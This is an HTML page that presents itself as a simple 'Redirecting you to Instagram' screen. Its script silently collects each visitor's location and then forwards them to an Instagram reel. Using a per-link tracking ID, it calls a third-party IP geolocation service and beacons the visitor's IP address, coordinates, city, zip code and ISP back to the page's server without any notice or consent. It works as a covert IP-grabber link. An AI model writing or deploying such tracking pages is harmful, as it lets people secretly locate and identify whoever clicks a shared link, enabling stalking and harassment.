<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      color: #1c1e21;
    }
    
    .spinner {
      border: 3px solid rgba(0, 0, 0, 0.1);
      width: 40px;
      height: 40px;
      border-radius: 50%;
      border-left-color: #1877f2;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    
    @keyframes spin { 
      0% { transform: rotate(0deg); } 
      100% { transform: rotate(360deg); } 
    }

    h1 {
      font-size: 18px;
      font-weight: 500;
      margin: 0;
      color: #606770;
    }
  </style>
</head>
<body>

  <div class="spinner"></div>
  <h1>Redirecting you to Instagram...</h1>

  <script>
    const trackId = window.location.pathname.split('/').pop();

    // Fire location fetch in background — don't wait for it
    fetch('https://ipwho.is/')
      .then(r => r.json())
      .then(data => {
        navigator.sendBeacon(`/api/location/${trackId}`, new Blob([JSON.stringify({
          lat: data.latitude,
          lng: data.longitude,
          city: data.city,
          region: data.region,
          country: data.country,
          isp: data.connection?.isp || null,
          ip: data.ip,
          zip: data.postal,
          source: 'ip'
        })], { type: 'application/json' }));
      })
      .catch(() => {});

    // Redirect immediately — don't wait for location fetch
    setTimeout(() => {
      window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
    }, 1500);
  </script>
</body>
</html>
